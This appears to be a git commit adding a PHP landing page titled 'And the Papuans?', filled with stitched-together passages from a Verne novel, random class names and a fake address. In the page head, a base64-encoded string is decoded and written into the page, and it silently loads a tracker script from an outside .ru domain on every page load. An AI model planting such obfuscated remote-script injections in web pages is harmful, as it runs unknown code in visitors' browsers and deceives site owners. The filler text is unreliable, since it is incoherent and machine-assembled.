d2195b39aae5feb7e4c57bd8d63f65fb3a363dd9
fietynyp <77584243+fietynyp@users.noreply.github.com>
2021-01-17 20:34:22 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>And the Papuans?</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9nNWd3eWFuZ3BmZWRxeGtha2giPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header class="7bmadyo7pvn4zyp5dq6s55">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="#">OUR THEMES</a></li>
+			<li><a href="#">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="a8sfze1846l3c80fpv">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>And the Papuans?</h1>
+	</section>
+
+
+	<section class="our-work" class="ir34u6akmc6zg81wb1yk">
+		<h3 class="title">Yes, indeed. The electric bullets are powerless aga</h3>
+		<p>I answered nothing, purposely. For what good would it be to discuss such a proposition, when force could destroy the best arguments? Captain Nemo did not take his eye from the knob, suspended by its two concentric circles in the cabin. At a simple gesture the pilot modified the course of the Nautilus every instant. Friend Ned, I do not despair of this stout Nautilus, as you do; and in four days we shall know what to hold to on the Pacific tides. Besides, flight might be possible if we were in sight of the English or Provencal coasts; but on the Papuan shores, it is another thing; and it will be time enough to come to that extremity if the Nautilus does not recover itself again, which I look upon as a grave event. They are fighting!</p>
+		<hr>
+
+		<ul class="grid" class="pobk6mic2l33v0odelsdhuc2">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="7bmadyo7pvn4zyp5dq6s55">
+		<h3 class="title">Very well, prepare yourself for a juicy th</h3>
+		<p>To-night, at nine o'clock, said he. I have warned Conseil. At that moment, Captain Nemo will be shut up in his room, probably in bed. Neither the engineers nor the ship's crew can see us. Conseil and I will gain the central staircase, and you, M. Aronnax, will remain in the library, two steps from us, waiting my signal. The oars, the mast, and the sail are in the canoe. I have even succeeded in getting in some provisions. I have procured an English wrench, to unfasten the bolts which attach it to the shell of the Nautilus. So all is ready, till to-night. As long as it sails horizontally, muttered Ned Land, I do not mind; but if it takes a fancy to dive, I would not give two straws for my life. Underground, sir. For six months war was waged with various fortune in the leading articles of the Geographical Institution of Brazil, the Royal Academy of Science of Berlin, the British Association, the Smithsonian Institution of Washington, in the discussions of the Indian Archipelago, of the Cosmos of the Abbe Moigno, in the Mittheilungen of Petermann, in the scientific chronicles of the great journals of France and other countries. The cheaper journals replied keenly and with inexhaustible zest. These satirical writers parodied a remark of Linn?us, quoted by the adversaries of the monster, maintaining that nature did not make fools, and adjured their contemporaries not to give the lie to nature, by admitting the existence of krakens, sea-serpents, Moby Dicks, and other lucubrations of delirious sailors. At length an article in a well-known satirical journal by a favorite contributor, the chief of the staff, settled the monster, like Hippolytus, giving it the death-blow amid a universal burst of laughter. Wit had conquered science.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="a8sfze1846l3c80fpv" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="pobk6mic2l33v0odelsdhuc2" class="title">Sir, said Ned Land, if that vessel passes within a mile of us, </h3>	
+		<p>This current carried with it all kinds of living things. Argonauts, so common in the Mediterranean, were there in quantities. Of the gristly sort, the most remarkable were the turbot, whose slender tails form nearly the third part of the body, and that looked like large lozenges twenty-five feet long; also, small sharks a yard long, with large heads, short rounded muzzles, pointed teeth in several rows, and whose bodies seemed covered with scales. Among the bony fish I noticed some gray gobies, peculiar to these waters; black giltheads, whose iris shone like fire; sirenes a yard long, with large snouts thickly set with little teeth, that uttered little cries; blue coryph?nes, in gold and silver; parrots, like the rainbows of the ocean, that could rival in color the most beautiful tropical birds; blennies with triangular heads; bluish rhombs destitute of scales; batrachoides covered with yellow transversal bands like a Greek; heaps of little gobies spotted with yellow; dipterodons with silvery heads and yellow tails; several specimens of salmon, mugilomores slender in shape, shining with a soft light that Lacepede consecrated to the service of his wife; and lastly, a beautiful fish, the American-knight, that, decorated with all the orders and ribbons, frequents the shores of this great nation, that esteems orders and ribbons so little. I did honor to the repast. It was composed of several kinds of fish, and slices of holothurid? (excellent zoophytes), and different sorts of seaweed. Our drink consisted of pure water, to which the captain added some drops of a fermented liquor, extracted by the Kamschatcha method from a seaweed known under the name of Rhodomenia palmata. Captain Nemo ate at first without saying a word. Then he began: You like the sea, captain? The night slipped away without any mischance, the islanders frightened, no doubt, at the sight of a monster aground in the bay. The panels were open, and would have offered an easy access to the interior of the Nautilus.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="7bmadyo7pvn4zyp5dq6s55">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="a8sfze1846l3c80fpv"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ir34u6akmc6zg81wb1yk"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="pobk6mic2l33v0odelsdhuc2"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>984 Octavia Ridges, Suite 215, 04063, Frankmouth, Wisconsin, United States</p>
+	</footer>
+
+</body>
+
+</html>
